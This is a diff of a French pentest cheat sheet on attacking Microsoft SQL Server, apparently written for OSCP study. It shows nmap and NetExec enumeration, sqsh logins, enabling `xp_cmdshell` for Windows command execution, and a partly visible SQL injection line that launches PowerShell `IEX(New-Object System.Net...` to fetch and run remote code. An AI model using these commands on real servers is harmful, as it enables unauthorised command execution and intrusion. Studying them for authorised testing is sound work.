@@ -2026,39 +2026,33 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(&(obje
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Nmap MSSQL : identifier le service SQL Server et les informations NTLM exposées sans exécuter de commande SQL.</p>
+<p class="oscp-command-note">Nmap : identifier SQL Server et les informations NTLM disponibles.</p>
 
 ```bash
 nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info 192.0.2.10
 
-# Identifier la version et les informations MSSQL sans scripts d'exécution ni extraction de secrets
-nmap -sV -p 1433 --script ms-sql-info 192.0.2.10
-
 ```
 
-<p class="oscp-command-note">NetExec MSSQL : vérifier les identifiants et demander whoami sur le serveur uniquement si les droits d'exécution le permettent.</p>
+<p class="oscp-command-note">NetExec : vérifier le compte et exécuter `whoami` si autorisé.</p>
 
 ```bash
 # Avec NetExec MSSQL, -x demande l'exécution d'une commande système, pas d'une requête SQL
 nxc mssql 192.0.2.10 -d exemple.local -u utilisateur -p 'MotDePasseTest' -x 'whoami'
 
-# Lister les bases MSSQL via une connexion SQL dédiée (la commande -x précédente n'est pas adaptée)
-# Après connexion avec impacket-mssqlclient, saisir : SELECT name FROM sys.databases;
-
 ```
 
-<p class="oscp-command-note">sqsh : client SQL Server en terminal ; -P expose le mot de passe dans la ligne de commande, préférer une saisie sécurisée.</p>
+<p class="oscp-command-note">sqsh : ouvrir une session SQL Server. Saisir le mot de passe à l'invite.</p>
 
 ```bash
 # Se connecter à MSSQL avec sqsh sous Linux (client installé requis)
-sqsh -S <target_ip> -U <username> -P <password>
+sqsh -S <IP_CIBLE> -U <UTILISATEUR>
 
 # Se connecter avec un compte de domaine et sélectionner une base (si sqsh est installé)
-sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
+sqsh -S <IP_CIBLE> -U '<DOMAINE>\<UTILISATEUR>' -D <BASE>
 
 ```
 
-<p class="oscp-command-note">SQL Server : activer xp_cmdshell modifie la configuration globale et nécessite des privilèges élevés ; rétablir la configuration initiale après le test.</p>
+<p class="oscp-command-note">SQL Server : `xp_cmdshell` exécute des commandes Windows. Droits élevés requis ; configuration modifiée.</p>
 
 ```sql
 -- Activer les options avancées et xp_cmdshell (modifie la configuration du serveur ; droits élevés requis)
@@ -2070,7 +2064,7 @@ EXEC SP_CONFIGURE 'xp_cmdshell', 1;
 RECONFIGURE;
 GO
 
--- Vérifier l'exécution de commandes système via xp_cmdshell avec une action de lecture seule
+-- Vérifier l'identité du compte Windows exécutant la commande
 EXEC xp_cmdshell 'whoami';
 GO
 
@@ -2093,23 +2087,23 @@ test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net
 -- SQL Server : lister les bases visibles pour le compte courant
 SELECT name FROM sys.databases;
                 
--- SQL Server : lister les tables et vues accessibles via INFORMATION_SCHEMA
-SELECT * FROM information_schema.tables;
+-- SQL Server : lister les tables et vues de la base courante
+SELECT TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES;
 
--- SQL Server : lire les lignes d'une table autorisée (remplacer le nom de table)
-SELECT * FROM <table_name>;
+-- SQL Server : lire au maximum 10 lignes d'une table existante
+SELECT TOP (10) * FROM dbo.exemple;
 
--- SQL Server : filtrer les lignes avec LIKE (adapter la colonne et le motif)
-SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';
+-- SQL Server : filtrer les résultats ; adapter les noms et la valeur
+SELECT TOP (10) * FROM dbo.exemple WHERE nom LIKE '%test%';
 
--- SQL Server : insérer une ligne ; opération d'écriture à éviter hors laboratoire
-INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');
+-- SQL Server : insérer une ligne dans une table de laboratoire existante
+INSERT INTO dbo.test_table (name) VALUES ('exemple_oscp');
 
--- SQL Server : modifier des lignes ; définir une condition WHERE précise avant exécution
-UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;
+-- SQL Server : modifier uniquement la ligne de test, si elle existe
+UPDATE dbo.test_table SET name = 'exemple_modifie' WHERE name = 'exemple_oscp';
 
--- SQL Server : supprimer des lignes ; opération destructive à réserver aux données de test
-DELETE FROM <table_name> WHERE <condition>;
+-- SQL Server : supprimer la ligne de test, si elle existe
+DELETE FROM dbo.test_table WHERE name = 'exemple_modifie';
 
 ```
 
